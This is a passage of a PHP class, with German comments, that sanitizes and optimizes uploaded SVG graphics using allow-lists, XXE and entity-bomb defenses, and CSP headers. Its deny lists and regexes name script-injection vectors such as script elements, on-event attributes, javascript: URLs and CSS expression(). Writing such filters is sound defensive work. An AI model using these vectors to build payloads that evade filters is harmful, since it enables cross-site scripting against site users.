<?php
declare(strict_types=1);

namespace Core;

/**
 * SVG-Grafiken für die Mediathek: bereinigen (Positivliste) und leicht optimieren – eigener Code auf DOMDocument,
 * ohne fremde Bibliothek (der Kern ist MIT; enshrined/svg-sanitize wäre GPL).
 *
 * Ablauf von clean():
 *  1. Eingebettete Bild- oder Schriftdaten (data:image/png …, @font-face mit data:) → Upload abgelehnt: SVG ist nur für
 *     Vektorgrafiken da, ein „Bildschirmfoto als SVG“ wäre nach dem Bereinigen leer.
 *  2. Höchstens 2 MB; DOCTYPE wird entfernt – nur einfache interne Entities (Illustrator: &ns_svg;) werden einmalig
 *     eingesetzt, verschachtelte oder externe Entities fallen weg (keine Entity-Bomben, kein XXE). Einlesen mit
 *     LIBXML_NONET, ohne NOENT/DTDLOAD, höchstens 50 000 Knoten.
 *  3. Neuaufbau als neues Dokument: nur erlaubte SVG-Elemente und -Attribute werden übernommen. Weg sind u. a. script,
 *     foreignObject, iframe/embed/object, image/feImage, alle SMIL-Animationen, on…-Attribute, Verweise außer lokalen
 *     #ids, url(…) außer url(#id), gefährliches CSS (@import, expression(), behavior, -moz-binding), Kommentare,
 *     Processing Instructions (xml-stylesheet), Metadaten und Editor-Daten (Inkscape, Sodipodi, Illustrator, Sketch, Figma, Serif).
 *  4. Optimieren: ungenutzte ids und Definitionen, leere Gruppen/defs, Leerraum; Zahlen in Pfaden und Koordinaten auf
 *     3 Nachkommastellen (bei sehr kleinen viewBoxen mehr). title/desc/aria bleiben.
 *  5. Wurzel <svg> mit xmlns und viewBox (sonst aus width/height), Maße für die Mediathek aus der viewBox.
 *
 * Ausgeliefert wird die Datei als <img src="….svg"> – aktive Inhalte liefen dort ohnehin nicht; die Bereinigung ist
 * die zweite Verteidigungslinie. Dazu Kopfzeilen für direkt aufgerufene .svg (guard(), Handbuch → Technik → Medien).
 */
final class Svg
{
    public const MIME = 'image/svg+xml';
    public const MAX_BYTES = 2 * 1024 * 1024;
    public const MAX_NODES = 50_000;
    /** Gezeichnete Elemente einschließlich aller <use>-Wiederholungen (Schutz vor „use-Bomben“) */
    private const MAX_RENDER = 200_000;
    /** Kopfzeilen für direkt aufgerufene SVG-Dateien (Apache: guard(), nginx: Handbuch) */
    public const CSP = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; sandbox";

    private const NS = 'http://www.w3.org/2000/svg';
    private const XLINK = 'http://www.w3.org/1999/xlink';
    private const XMLNS = 'http://www.w3.org/XML/1998/namespace';
    private const XHTML = 'http://www.w3.org/1999/xhtml';

    /** Erlaubte Elemente (statisches SVG) */
    private const ELEMENTS = [
        'svg', 'g', 'defs', 'symbol', 'use', 'switch', 'path', 'rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon',
        'text', 'tspan', 'textPath', 'linearGradient', 'radialGradient', 'stop', 'clipPath', 'mask', 'pattern', 'marker',
        'filter', 'title', 'desc', 'style',
        'feBlend', 'feColorMatrix', 'feComponentTransfer', 'feComposite', 'feConvolveMatrix', 'feDiffuseLighting',
        'feDisplacementMap', 'feDistantLight', 'feDropShadow', 'feFlood', 'feFuncA', 'feFuncB', 'feFuncG', 'feFuncR',
        'feGaussianBlur', 'feMerge', 'feMergeNode', 'feMorphology', 'feOffset', 'fePointLight', 'feSpecularLighting',
        'feSpotLight', 'feTile', 'feTurbulence',
    ];
    /** Aktive oder nachladende Elemente – werden mit Inhalt entfernt und als „unsicher“ gezählt */
    private const UNSAFE_ELEMENTS = [
        'script', 'foreignObject', 'iframe', 'embed', 'object', 'handler', 'listener', 'image', 'feImage', 'audio', 'video',
        'canvas', 'animate', 'animateColor', 'animateMotion', 'animateTransform', 'set', 'mpath', 'discard', 'cursor',
        'font-face-uri', 'link', 'meta', 'base', 'form', 'input', 'button',
    ];
    /** Elemente mit Text als Inhalt */
    private const TEXT_PARENTS = ['text', 'tspan', 'textPath', 'title', 'desc'];
    /** Elemente, die nur über einen Verweis gezeichnet werden (ohne Verweis entbehrlich) */
    private const DEFINITIONS = ['linearGradient', 'radialGradient', 'pattern', 'clipPath', 'mask', 'filter', 'marker', 'symbol'];
    /** Elemente, die etwas zeichnen (mindestens eines muss übrig bleiben) */
    private const SHAPES = ['path', 'rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon', 'text', 'use'];
    /** href nur auf diesen Elementen – und nur als lokaler #Verweis */
    private const HREF_ELEMENTS = ['use', 'textPath', 'linearGradient', 'radialGradient', 'pattern', 'filter'];

    /** Darstellungsattribute – auch als CSS-Eigenschaften erlaubt */
    private const PRESENTATION = [
        'alignment-baseline', 'baseline-shift', 'clip', 'clip-path', 'clip-rule', 'color', 'color-interpolation',
        'color-interpolation-filters', 'color-rendering', 'direction', 'display', 'dominant-baseline',
        'fill', 'fill-opacity', 'fill-rule', 'filter', 'flood-color', 'flood-opacity', 'font', 'font-family', 'font-size',
        'font-size-adjust', 'font-stretch', 'font-style', 'font-variant', 'font-weight', 'glyph-orientation-horizontal',
        'glyph-orientation-vertical', 'image-rendering', 'isolation', 'kerning', 'letter-spacing', 'lighting-color', 'marker',
        'marker-end', 'marker-mid', 'marker-start', 'mask', 'mask-type', 'mix-blend-mode', 'opacity', 'overflow', 'paint-order',
        'shape-rendering', 'stop-color', 'stop-opacity', 'stroke', 'stroke-dasharray', 'stroke-dashoffset',
        'stroke-linecap', 'stroke-linejoin', 'stroke-miterlimit', 'stroke-opacity', 'stroke-width', 'text-anchor',
        'text-decoration', 'text-rendering', 'transform', 'transform-origin', 'unicode-bidi', 'vector-effect', 'visibility',
        'word-spacing', 'writing-mode',
    ];
    /** Weitere CSS-Eigenschaften (nur in style) */
    private const CSS_EXTRA = [
        'line-height', 'white-space', 'transform-box', 'text-transform', 'font-feature-settings', 'font-variation-settings',
        'font-kerning', 'font-variant-ligatures', 'font-variant-numeric', 'solid-color', 'solid-opacity', 'text-decoration-line',
        'text-decoration-color', 'text-decoration-style', 'inline-size', 'x', 'y', 'cx', 'cy', 'r', 'rx', 'ry', 'width', 'height',
    ];
    /** Geometrie, Struktur, Verläufe, Filter, Text */
    private const ATTRIBUTES = [
        'id', 'class', 'style', 'x', 'y', 'x1', 'y1', 'x2', 'y2', 'cx', 'cy', 'r', 'rx', 'ry', 'fx', 'fy', 'fr', 'width', 'height',
        'd', 'points', 'pathLength', 'viewBox', 'preserveAspectRatio', 'gradientUnits', 'gradientTransform', 'spreadMethod',
        'offset', 'patternUnits', 'patternContentUnits', 'patternTransform', 'clipPathUnits', 'maskUnits', 'maskContentUnits',
        'markerUnits', 'markerWidth', 'markerHeight', 'refX', 'refY', 'orient', 'filterUnits', 'primitiveUnits', 'in', 'in2',
        'result', 'stdDeviation', 'dx', 'dy', 'rotate', 'lengthAdjust', 'textLength', 'startOffset', 'method', 'spacing', 'side',
        'mode', 'operator', 'k1', 'k2', 'k3', 'k4', 'values', 'type', 'tableValues', 'slope', 'intercept', 'amplitude',
        'exponent', 'order', 'kernelMatrix', 'divisor', 'bias', 'targetX', 'targetY', 'edgeMode', 'kernelUnitLength',
        'preserveAlpha', 'surfaceScale', 'diffuseConstant', 'specularConstant', 'specularExponent', 'azimuth', 'elevation',
        'z', 'pointsAtX', 'pointsAtY', 'pointsAtZ', 'limitingConeAngle', 'scale', 'xChannelSelector', 'yChannelSelector',
        'radius', 'baseFrequency', 'numOctaves', 'seed', 'stitchTiles', 'systemLanguage', 'lang', 'role',
    ];
    /** Zahlen in diesen Attributen werden gerundet (nur reine Zahlen ohne Einheit bzw. mit px) */
    private const ROUND_ATTRS = ['x', 'y', 'x1', 'y1', 'x2', 'y2', 'cx', 'cy', 'r', 'rx', 'ry', 'fx', 'fy', 'width', 'height'];

    private int $unsafe = 0;
    private int $other = 0;
    private bool $noNs = false;
    private int $dec = 3;
    /** Klassen/ids, die in <style> vorkommen (Selektoren) */
    private array $cssIds = [];

    /**
     * Bereinigt und optimiert eine SVG-Datei.
     * @return array{svg: string, width: int, height: int, in: int, out: int, unsafe: int, other: int}
     * @throws \RuntimeException mit verständlicher Meldung (Upload ablehnen)
     */
    public static function clean(string $raw): array
    {
        return (new self())->run($raw);
    }

    /** Ist das (laut finfo, Name und Dateianfang) eine SVG-Datei? */
    public static function detect(string $path, string $mime, string $name = ''): bool
    {
        if ($mime === self::MIME || $mime === 'image/svg') return true;
        if (!in_array($mime, ['text/xml', 'application/xml', 'text/plain', 'text/html'], true)) return false;
        if (!preg_match('~\.svgz?$~i', $name)) return false;
        return (bool) preg_match('~<svg[\s>]~i', (string) @file_get_contents($path, false, null, 0, 8192));
    }

    /** Meldung für die Oberfläche: „SVG bereinigt und optimiert: 48 KB → 12 KB, 3 unsichere Elemente entfernt“ */
    public static function note(array $stats): string
    {
        $n = (int) ($stats['unsafe'] ?? 0);
        $msg = __('SVG bereinigt und optimiert: {in} → {out}', ['in' => self::size((int) ($stats['in'] ?? 0)), 'out' => self::size((int) ($stats['out'] ?? 0))]);
        if ($n > 0) $msg .= ', ' . ($n === 1 ? __('1 unsicheres Element entfernt') : __('{n} unsichere Elemente entfernt', ['n' => $n]));
        return $msg;
    }

    private static function size(int $b): string
    {
        if ($b < 1024) return $b . ' B';
        if ($b < 1048576) return number_format($b / 1024, $b < 10240 ? 1 : 0, ',', '.') . ' KB';
        return number_format($b / 1048576, 1, ',', '.') . ' MB';
    }

    /**
     * Kopfzeilen für direkt aufgerufene .svg-Dateien im Medienordner (Apache, .htaccess): CSP mit sandbox + nosniff.
     * nginx liest keine .htaccess – dort die Zeile aus dem Handbuch (Technik → Medien) eintragen.
     */
    public static function guard(string $dir): void
    {
        $file = rtrim($dir, '/') . '/.htaccess';
        if (is_file($file) || !is_dir($dir) || !is_writable($dir)) return;
        @file_put_contents($file, "# KLXM Studio (Core\\Svg::guard): SVG-Dateien der Mediathek abschotten\n"
            . "<IfModule mod_headers.c>\n  <FilesMatch \"\\.svg$\">\n"
            . "    Header set Content-Security-Policy \"" . self::CSP . "\"\n"
            . "    Header set X-Content-Type-Options \"nosniff\"\n  </FilesMatch>\n</IfModule>\n"
            . "<IfModule mod_mime.c>\n  AddType image/svg+xml .svg\n</IfModule>\n");
    }

    // ================================================================= Rastern (App-Icons)

    /** Kann der Server SVG in Pixel umwandeln? (Imagick mit SVG-Unterstützung) */
    public static function canRasterize(): bool
    {
        static $ok = null;
        return $ok ??= class_exists(\Imagick::class) && (bool) @\Imagick::queryFormats('SVG');
    }

    /** SVG (bereinigt, aus der Mediathek) als quadratisch eingepasstes GD-Bild – null ohne Imagick oder bei Fehlern */
    public static function rasterize(string $file, int $size = 1024): ?\GdImage
    {
        if (!self::canRasterize() || !is_file($file)) return null;
        try {
            if (defined('Imagick::RESOURCETYPE_TIME')) \Imagick::setResourceLimit(\Imagick::RESOURCETYPE_TIME, 15);
            $im = new \Imagick();
            $im->setBackgroundColor(new \ImagickPixel('transparent'));
            $im->setResolution(288, 288);
            $im->readImageBlob((string) file_get_contents($file));
            $im->setImageFormat('png32');
            $im->thumbnailImage($size, $size, true, false);
            // Ganz einpassen (Logos nicht beschneiden): transparent auf ein Quadrat erweitern
            $im->extentImage($size, $size, -intdiv($size - $im->getImageWidth(), 2), -intdiv($size - $im->getImageHeight(), 2));
            $img = @imagecreatefromstring($im->getImageBlob());
            $im->clear();
            if (!$img) return null;
            imagealphablending($img, true);
            imagesavealpha($img, true);
            return $img;
        } catch (\Throwable $e) {
            error_log('[svg] rasterize: ' . $e->getMessage());
            return null;
        }
    }

    // ================================================================= Bereinigen

    private function run(string $raw): array
    {
        $in = strlen($raw);
        if (str_starts_with($raw, "\x1f\x8b")) {
            throw new \RuntimeException(__('Komprimierte SVG-Dateien (.svgz) werden nicht unterstützt – bitte als normale SVG speichern.'));
        }
        // Eingebettete Bilder/Schriften zuerst – auch bei zu großen Dateien die hilfreichere Meldung
        self::embedded($raw);
        if ($in > self::MAX_BYTES) {
            throw new \RuntimeException(__('SVG ist zu groß (max. {mb} MB). Bitte vereinfachen oder als PNG hochladen.', ['mb' => self::MAX_BYTES / 1048576]));
        }
        $raw = preg_replace('~^\xEF\xBB\xBF~', '', $raw);
        if (!preg_match('~<svg[\s>/]~', $raw)) throw new \RuntimeException(__('Keine gültige SVG-Datei.'));
        $raw = $this->doctype($raw);

        $prev = libxml_use_internal_errors(true);
        $src = new \DOMDocument();
        $ok = $src->loadXML($raw, LIBXML_NONET | LIBXML_NOCDATA | LIBXML_COMPACT);
        libxml_clear_errors();
        libxml_use_internal_errors($prev);
        $root = $ok ? $src->documentElement : null;
        if (!$root || $src->doctype !== null || $root->localName !== 'svg' || !in_array($root->namespaceURI, [self::NS, null], true)) {
            throw new \RuntimeException(__('Keine gültige SVG-Datei (kein lesbares XML mit <svg> als Wurzel).'));
        }
        if ($src->getElementsByTagName('*')->length > self::MAX_NODES) {
            throw new \RuntimeException(__('SVG ist zu komplex (mehr als {n} Elemente).', ['n' => number_format(self::MAX_NODES, 0, ',', '.')]));
        }
        $this->noNs = $root->namespaceURI === null;
        foreach ($src->childNodes as $n) {
            if ($n instanceof \DOMProcessingInstruction && $n->target !== 'xml') $this->unsafe++;   // xml-stylesheet u. a.
        }

        // Maße und Rundung aus der viewBox
        [$vb, $w, $h] = $this->box($root);
        $this->dec = max(3, min(6, (int) ceil(log10(10000 / max(1e-9, max($vb[2], $vb[3]))))));

        $doc = new \DOMDocument('1.0', 'UTF-8');
        $out = $doc->createElementNS(self::NS, 'svg');
        $doc->appendChild($out);
        $this->attributes($root, $out);
        $out->removeAttribute('x');   // an der Wurzel wirkungslos (Illustrator: x="0px" y="0px")
        $out->removeAttribute('y');
        $out->setAttribute('viewBox', implode(' ', array_map(fn($n) => $this->num($n, 6), $vb)));
        if (!$this->absolute($out->getAttribute('width')) || !$this->absolute($out->getAttribute('height'))) {
            $out->setAttribute('width', $this->num($w, 3));
            $out->setAttribute('height', $this->num($h, 3));
        }
        $this->children($root, $out, 0);

        $this->optimize($doc);
        $this->complexity($doc);
        if (!$this->drawsSomething($out)) {
            throw new \RuntimeException(__('Die SVG enthält nach dem Bereinigen nichts Darstellbares – bitte die Datei prüfen oder als PNG hochladen.'));
        }
        $svg = (string) $doc->saveXML($out);
        return [
            'svg' => $svg, 'width' => max(1, (int) round($vb[2])), 'height' => max(1, (int) round($vb[3])),
            'in' => $in, 'out' => strlen($svg), 'unsafe' => $this->unsafe, 'other' => $this->other,
        ];
    }

    /** Eingebettete Pixelbilder oder Schriften → ablehnen */
    private static function embedded(string $s): void
    {
        if (stripos($s, 'data:') === false && stripos($s, 'data&#') === false && stripos($s, '@font-face') === false) return;
        // Leerraum und einfache Zeichen-Entities (data&#58;image …) ausgleichen
        $x = strtolower(preg_replace('~\s+~', '', html_entity_decode($s, ENT_QUOTES | ENT_XML1, 'UTF-8')));
        if (preg_match('~data:(image/(png|jpe?g|pjpeg|gif|webp|bmp|x-ms-bmp|avif|tiff?|x-icon|vnd\.microsoft\.icon|heic|heif|jxl|apng)|application/octet-stream)~', $x)) {
            throw new \RuntimeException(__('Diese SVG enthält eingebettete Bilddaten (z. B. ein Bildschirmfoto). Bitte als PNG, JPG oder WebP hochladen – SVG ist nur für Vektorgrafiken erlaubt.'));
        }
        if (preg_match('~data:(font/|application/(x-)?font|application/vnd\.ms-fontobject)~', $x) || preg_match('~@font-face\{[^}]*data:~', $x)) {
            throw new \RuntimeException(__('Diese SVG enthält eingebettete Schriftdateien. Bitte die Texte im Grafikprogramm in Pfade umwandeln und erneut als SVG speichern.'));
        }
    }

    /** DOCTYPE entfernen; einfache interne Entities einmalig einsetzen, alles andere verwerfen */
    private function doctype(string $s): string
    {
        if (stripos($s, '<!DOCTYPE') === false && stripos($s, '<!ENTITY') === false) {
            return $s;
        }
        if (!preg_match('~<!DOCTYPE\s[^\[>]*(?:\[(.*?)\]\s*)?>~is', $s, $m, PREG_OFFSET_CAPTURE)) {
            throw new \RuntimeException(__('Keine gültige SVG-Datei (fehlerhafte DOCTYPE-Angabe).'));
        }
        $subset = $m[1][0] ?? '';
        $s = substr_replace($s, '', $m[0][1], strlen($m[0][0]));
        if (stripos($s, '<!DOCTYPE') !== false || stripos($s, '<!ENTITY') !== false) {
            throw new \RuntimeException(__('Keine gültige SVG-Datei (fehlerhafte DOCTYPE-Angabe).'));
        }
        $ents = [];
        $total = preg_match_all('~<!ENTITY~i', $subset);
        preg_match_all('~<!ENTITY\s+(%\s*)?([A-Za-z_][\w.\-]*)\s+(?:"([^"]*)"|\'([^\']*)\')\s*>~', $subset, $all, PREG_SET_ORDER);
        foreach ($all as $e) {
            $v = ($e[3] ?? '') !== '' ? $e[3] : ($e[4] ?? '');
            // Parameter-Entities, verschachtelte Verweise, Markup, lange Werte: weg (Entity-Bomben, XXE)
            if ($e[1] !== '' || strlen($v) > 2048 || strpbrk($v, '&%<') !== false || count($ents) >= 64) continue;
            $ents[$e[2]] = $v;
        }
        $this->unsafe += max(0, $total - count($ents));
        $s = (string) preg_replace_callback('~&([A-Za-z_][\w.\-]*);~', function ($r) use ($ents) {
            if (in_array($r[1], ['amp', 'lt', 'gt', 'quot', 'apos'], true)) return $r[0];
            if (isset($ents[$r[1]])) return htmlspecialchars($ents[$r[1]], ENT_QUOTES | ENT_XML1, 'UTF-8');
            $this->unsafe++;
            return '';
        }, $s);
        if (strlen($s) > self::MAX_BYTES * 2) {
            throw new \RuntimeException(__('SVG ist zu groß (max. {mb} MB). Bitte vereinfachen oder als PNG hochladen.', ['mb' => self::MAX_BYTES / 1048576]));
        }
        return $s;
    }

    /** @return array{0: float[], 1: float, 2: float} [viewBox, Breite, Höhe] */
    private function box(\DOMElement $root): array
    {
        $vb = preg_split('~[\s,]+~', trim($root->getAttribute('viewBox')), -1, PREG_SPLIT_NO_EMPTY) ?: [];
        $len = function (string $v): ?float {
            if (!preg_match('~^\s*([+]?(?:\d+\.?\d*|\.\d+)(?:e[-+]?\d+)?)\s*(px|pt|pc|mm|cm|in)?\s*$~i', $v, $m)) return null;
            $f = ['' => 1, 'px' => 1, 'pt' => 4 / 3, 'pc' => 16, 'mm' => 96 / 25.4, 'cm' => 96 / 2.54, 'in' => 96][strtolower($m[2] ?? '')];
            $n = (float) $m[1] * $f;
            return $n > 0 && is_finite($n) ? $n : null;
        };
        $w = $len($root->getAttribute('width'));
        $h = $len($root->getAttribute('height'));
        if (count($vb) === 4 && array_filter($vb, 'is_numeric') === $vb && (float) $vb[2] > 0 && (float) $vb[3] > 0) {
            $vb = array_map('floatval', $vb);
        } elseif ($w && $h) {
            $vb = [0.0, 0.0, $w, $h];
        } else {
            throw new \RuntimeException(__('Die SVG hat keine Größe (viewBox oder width/height fehlen). Bitte im Grafikprogramm mit Zeichenfläche exportieren.'));
        }
        if (max($vb[2], $vb[3]) > 1e7) throw new \RuntimeException(__('Keine gültige SVG-Datei (Maße unplausibel).'));
        // Anzeige-Maße: width/height der Datei, fehlende aus dem Seitenverhältnis der viewBox
        if ($w && !$h) $h = $w * $vb[3] / $vb[2];
        if ($h && !$w) $w = $h * $vb[2] / $vb[3];
        return [$vb, $w ?: $vb[2], $h ?: $vb[3]];
    }

    private function absolute(string $v): bool
    {
        return $v !== '' && (bool) preg_match('~^\s*(\d+\.?\d*|\.\d+)\s*(px|pt|pc|mm|cm|in)?\s*$~i', $v);
    }

    private function isSvg(\DOMNode $n): bool
    {
        return $n instanceof \DOMElement && ($n->namespaceURI === self::NS || ($this->noNs && $n->namespaceURI === null));
    }

    /** Kinder von $src nach $dst übernehmen (nur Erlaubtes) */
    private function children(\DOMElement $src, \DOMElement $dst, int $depth): void
    {
        if ($depth > 200) throw new \RuntimeException(__('SVG ist zu tief verschachtelt.'));
        $doc = $dst->ownerDocument;
        $textParent = in_array($dst->localName, self::TEXT_PARENTS, true);
        foreach ($src->childNodes as $c) {
            if ($c instanceof \DOMText) {   // auch CDATA
                if ($textParent) $dst->appendChild($doc->createTextNode($c->data));
                elseif (trim($c->data) !== '' && $dst->localName !== 'style') $this->other++;
                continue;
            }
            if ($c instanceof \DOMProcessingInstruction) { $this->unsafe++; continue; }
            if ($c instanceof \DOMComment) { $this->other++; continue; }
            if (!$c instanceof \DOMElement) continue;   // Entity-Verweise u. a.
            $name = $c->localName;
            if (!$this->isSvg($c)) {
                // Fremde Namensräume: Editor-Daten (sodipodi:namedview, i:pgf, rdf …) oder HTML
                if ($c->namespaceURI === self::XHTML || in_array($name, self::UNSAFE_ELEMENTS, true)) $this->unsafe++; else $this->other++;
                continue;
            }
            if (in_array($name, self::UNSAFE_ELEMENTS, true)) {
                if ($name === 'image' || $name === 'feImage') self::embedded($c->getAttribute('href') . ' ' . $c->getAttributeNS(self::XLINK, 'href'));
                $this->unsafe++;
                continue;
            }
            if ($name === 'a') {
                // Links wirken im <img> ohnehin nicht: Inhalt behalten, Link weg
                $href = strtolower(preg_replace('~\s+~', '', $c->getAttribute('href') . $c->getAttributeNS(self::XLINK, 'href')));
                preg_match('~^(javascript|vbscript|data|livescript):~', $href) ? $this->unsafe++ : $this->other++;
                $this->children($c, $dst, $depth + 1);
                continue;
            }
            if (!in_array($name, self::ELEMENTS, true)) { $this->other++; continue; }   // metadata, font, view …
            if ($name === 'style') {
                $css = $this->sheet($c->textContent, 0);
                if (trim($css) !== '') $dst->appendChild($doc->createElementNS(self::NS, 'style'))->appendChild($doc->createTextNode($css));
                continue;
            }
            $el = $dst->appendChild($doc->createElementNS(self::NS, $name));
            $this->attributes($c, $el);
            if ($name === 'use' && !$el->hasAttribute('href') && !$el->hasAttributeNS(self::XLINK, 'href')) {
                $dst->removeChild($el);
                continue;
            }
            $this->children($c, $el, $depth + 1);
        }
    }

    /** Attribute nach Positivliste übernehmen */
    private function attributes(\DOMElement $src, \DOMElement $dst): void
    {
        $el = $dst->localName;
        foreach ($src->attributes as $a) {
            /** @var \DOMAttr $a */
            $ns = $a->namespaceURI;
            $name = $a->localName;
            $v = $a->value;
            if (strlen($v) > 1_000_000) { $this->other++; continue; }
            if ($ns === self::XLINK && $name === 'href' || $ns === null && $name === 'href') {
                self::embedded($v);
                if (!in_array($el, self::HREF_ELEMENTS, true) || !preg_match('~^\s*#[^\s#"\'<>()]+\s*$~', $v)) { $this->unsafe++; continue; }
                $ns === self::XLINK ? $dst->setAttributeNS(self::XLINK, 'xlink:href', trim($v)) : $dst->setAttribute('href', trim($v));
                continue;
            }
            if ($ns === self::XMLNS) {
                if (in_array($name, ['space', 'lang'], true)) $dst->setAttributeNS(self::XMLNS, 'xml:' . $name, $v);
                continue;
            }
            if ($ns !== null) { $this->other++; continue; }   // inkscape:, sodipodi:, i:, sketch:, serif:, data-… in Namensräumen
            if (stripos($name, 'on') === 0) { $this->unsafe++; continue; }
            if ($name === 'style') {
                $css = $this->decls($v);
                if ($css !== '') $dst->setAttribute('style', $css);
                continue;
            }
            $ok = in_array($name, self::ATTRIBUTES, true) || in_array($name, self::PRESENTATION, true)
                || preg_match('~^aria-[a-z]+$~', $name);
            if (!$ok) { $this->other++; continue; }
            self::embedded($v);
            if ($this->dangerous($v)) { $this->unsafe++; continue; }
            $dst->setAttribute($name, $v);
        }
    }

    /** Gefährlicher Wert: Skript-Schemata, externe url(…), CSS-Ausdrücke */
    private function dangerous(string $v): bool
    {
        $x = strtolower(preg_replace('~[\s\x00-\x1f]+~', '', $v));
        if (preg_match('~(javascript|vbscript|livescript):|expression\(|-moz-binding|behavior:|@import|data:~', $x)) return true;
        if (str_contains($x, 'url(')) {
            preg_match_all('~url\(([^)]*)\)~', $x, $m);
            if (substr_count($x, 'url(') !== count($m[1])) return true;
            foreach ($m[1] as $u) {
                if (!preg_match('~^[\'"]?#[^\'"()\\\\]+[\'"]?$~', $u)) return true;
            }
        }
        return false;
    }

    // ================================================================= CSS

    /** Stilblock (<style>): Regeln mit sicheren Selektoren und Deklarationen; @media/@supports eine Ebene tief */
    private function sheet(string $css, int $depth): string
    {
        $css = (string) preg_replace('~/\*.*?\*/~s', '', $css);
        $css = str_replace(['<!--', '-->'], '', $css);
        $out = '';
        $i = 0;
        $len = strlen($css);
        while ($i < $len) {
            while ($i < $len && ctype_space($css[$i])) $i++;
            if ($i >= $len) break;
            $brace = strpos($css, '{', $i);
            $semi = strpos($css, ';', $i);
            if ($css[$i] === '@' && $semi !== false && ($brace === false || $semi < $brace)) {
                $this->unsafe += (int) preg_match('~^@import~i', substr($css, $i, 8));   // @import, @charset, @namespace: weg
                $i = $semi + 1;
                continue;
            }
            if ($brace === false) break;
            $end = $this->closing($css, $brace);
            if ($end === null) break;
            $head = trim(substr($css, $i, $brace - $i));
            $body = substr($css, $brace + 1, $end - $brace - 1);
            $i = $end + 1;
            if ($head !== '' && $head[0] === '@') {
                $at = strtolower((string) preg_replace('~^@([\w-]+).*$~s', '$1', $head));
                if (in_array($at, ['media', 'supports'], true) && $depth < 1 && preg_match('~^@[\w-]+[\w\s:(),.\-]*$~', $head)) {
                    $inner = $this->sheet($body, $depth + 1);
                    if ($inner !== '') $out .= preg_replace('~\s+~', ' ', $head) . '{' . $inner . '}';
                } else {
                    $at === 'font-face' ? $this->unsafe++ : $this->other++;   // @font-face lädt nach, @keyframes u. a. entbehrlich
                }
                continue;
            }
            if (!preg_match('~^[\w\s.#:,>*+\~\-\[\]="\'()|^$]+$~u', $head) || str_contains($head, '\\')) { $this->unsafe++; continue; }
            $decls = $this->decls($body);
            if ($decls === '') continue;
            preg_match_all('~#([A-Za-z_][\w\-]*)~', $head, $ids);
            foreach ($ids[1] as $id) $this->cssIds[$id] = true;
            $out .= preg_replace('~\s*([,>+\~])\s*~', '$1', preg_replace('~\s+~', ' ', $head)) . '{' . $decls . '}';
        }
        return $out;
    }

    private function closing(string $s, int $open): ?int
    {
        $d = 0;
        for ($i = $open, $n = strlen($s); $i < $n; $i++) {
            if ($s[$i] === '{') $d++;
            elseif ($s[$i] === '}' && --$d === 0) return $i;
        }
        return null;
    }

    /** Deklarationen (style-Attribut bzw. Regelinhalt): nur bekannte Eigenschaften mit harmlosen Werten */
    private function decls(string $css): string
    {
        $out = [];
        foreach (explode(';', (string) preg_replace('~/\*.*?\*/~s', '', $css)) as $d) {
            if (trim($d) === '') continue;
            [$p, $v] = array_map('trim', explode(':', $d, 2)) + [1 => ''];
            $p = strtolower($p);
            if ($v === '' || !preg_match('~^[a-z][a-z\-]*$~', $p) || !(in_array($p, self::PRESENTATION, true) || in_array($p, self::CSS_EXTRA, true))) {
                $this->other++;
                continue;
            }
            if ($this->dangerous($v) || str_contains($v, '\\') || preg_match('~[<>{}@]~', $v)) { $this->unsafe++; continue; }
            $out[] = $p . ':' . preg_replace('~\s+~', ' ', $v);
        }
        return implode(';', $out);
    }

    // ================================================================= Optimieren

    private function optimize(\DOMDocument $doc): void
    {
        $root = $doc->documentElement;
        // Ungenutzte Definitionen entfernen, bis nichts mehr wegfällt (Verläufe verweisen auf Verläufe)
        for ($pass = 0; $pass < 8; $pass++) {
            $refs = $this->references($doc);
            $gone = 0;
            foreach ($this->all($root) as $el) {
                if (in_array($el->localName, self::DEFINITIONS, true) && !isset($refs[$el->getAttribute('id')])) {
                    $el->parentNode?->removeChild($el);
                    $gone++;
                }
            }
            if (!$gone) break;
        }
        $refs = $this->references($doc);
        foreach ($this->all($root) as $el) {
            if ($el->hasAttribute('id') && !isset($refs[$el->getAttribute('id')])) $el->removeAttribute('id');
            $this->roundAttributes($el);
        }
        // Leere Gruppen/defs entfernen, Gruppen ohne Attribute auflösen (von innen nach außen)
        foreach (array_reverse($this->all($root)) as $el) {
            if (!$el->parentNode) continue;
            if (in_array($el->localName, ['g', 'defs', 'switch'], true) && !$el->hasChildNodes() && !$el->hasAttribute('id')) {
                $el->parentNode->removeChild($el);
            } elseif ($el->localName === 'g' && !$el->hasAttributes() && $el->parentNode->localName !== 'switch') {
                while ($el->firstChild) $el->parentNode->insertBefore($el->firstChild, $el);
                $el->parentNode->removeChild($el);
            }
        }
    }

    /** @return \DOMElement[] $root und alle Elemente darunter (Dokumentreihenfolge) */
    private function all(\DOMElement $root): array
    {
        return [$root, ...iterator_to_array($root->getElementsByTagName('*'), false)];
    }

    /** Alle referenzierten ids: href="#id", url(#id), aria-labelledby/-describedby, Selektoren in <style> */
    private function references(\DOMDocument $doc): array
    {
        $refs = $this->cssIds;
        foreach ($this->all($doc->documentElement) as $el) {
            foreach ($el->attributes as $a) {
                $v = $a->value;
                if ($a->localName === 'href' && str_starts_with(trim($v), '#')) $refs[substr(trim($v), 1)] = true;
                if (in_array($a->localName, ['aria-labelledby', 'aria-describedby'], true)) {
                    foreach (preg_split('~\s+~', trim($v)) as $id) $refs[$id] = true;
                }
                if (str_contains($v, 'url(')) {
                    preg_match_all('~url\(\s*[\'"]?#([^\'")\s]+)~', $v, $m);
                    foreach ($m[1] as $id) $refs[$id] = true;
                }
            }
            if ($el->localName === 'style') {
                preg_match_all('~url\(\s*[\'"]?#([^\'")\s]+)~', $el->textContent, $m);
                foreach ($m[1] as $id) $refs[$id] = true;
            }
        }
        return $refs;
    }

    private function roundAttributes(\DOMElement $el): void
    {
        if ($el->hasAttribute('d')) $el->setAttribute('d', $this->path($el->getAttribute('d')));
        if ($el->hasAttribute('points')) {
            $v = $el->getAttribute('points');
            if (preg_match_all('~[-+]?(?:\d+\.?\d*|\.\d+)(?:[eE][-+]?\d+)?~', $v, $m) && count($m[0]) % 2 === 0) {
                $el->setAttribute('points', implode(' ', array_map(fn($n) => $this->num((float) $n, $this->dec), $m[0])));
            }
        }
        foreach (self::ROUND_ATTRS as $a) {
            if ($el->localName === 'svg' && in_array($a, ['width', 'height'], true)) continue;
            $v = $el->getAttribute($a);
            if ($v !== '' && preg_match('~^\s*([-+]?(?:\d+\.?\d*|\.\d+)(?:[eE][-+]?\d+)?)\s*(px)?\s*$~', $v, $m)) {
